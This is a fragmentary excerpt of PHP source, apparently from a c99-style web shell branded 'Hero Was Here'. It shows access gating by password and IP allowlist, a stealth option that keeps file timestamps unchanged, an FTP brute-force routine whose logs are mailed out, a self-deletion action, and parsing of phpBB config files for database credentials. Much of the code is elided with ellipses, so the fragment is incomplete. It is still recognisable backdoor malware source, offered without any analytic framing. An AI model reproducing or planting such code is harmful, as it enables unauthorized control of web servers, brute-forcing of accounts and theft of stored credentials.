<?
			...
			if (!isset($_SERVER['PHP_AUTH_USER']) || ($_SERVER['PHP_AUTH_USER'])!==$name || ($_SERVER['PHP_AUTH_PW'])!==$pass)
				{
				header('WWW-Authenticate: Basic realm="rugal"');
...
$shver = "Hero Was Here"; //Current version
...
$c99sh_updatefurl = ""; //Update server

$filestealth = false; //if true, don't change modify&access-time

$donated_html = "<center><b>Hero</b></center>";
...
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"\"> </a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if ($login)
{
...
{
 if ($selfwrite == "1") {$selfwrite = "msq.php";}
 c99sh_getupdate();
  ...
  if (!empty($submit))
  {
   ...
   else
   {
    if ($fqb_logging)
    {
     ...
     $fqb_log = "FTP Quick Brute (called v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
    ...
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
...
if ($act == "selfremove")
{
 ...
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using ".$shver."!"; exit; }
...
if ($act == "feedback")
{
 ...
 if (!empty($submit))
 {
  ...
  mail($suppmail,"".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
  ...
  elseif ($ft == "code")
  {
   if (ereg("phpBB 2.(.*) auto-generated config file",$r))
   {
    ...
    if (count($arr == 18))
    {
     ...
     else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported . Please, report us for fix.";}
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ . <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"></a></b></p></td></tr></table>
